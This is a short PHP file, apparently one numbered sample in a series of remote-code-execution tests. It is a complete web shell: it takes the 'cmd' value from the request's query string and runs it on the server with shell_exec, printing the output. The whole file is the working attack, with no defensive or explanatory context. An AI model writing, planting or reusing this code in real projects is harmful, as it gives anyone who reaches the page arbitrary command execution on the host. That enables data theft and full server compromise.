<?php
// RCE test variation #839
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>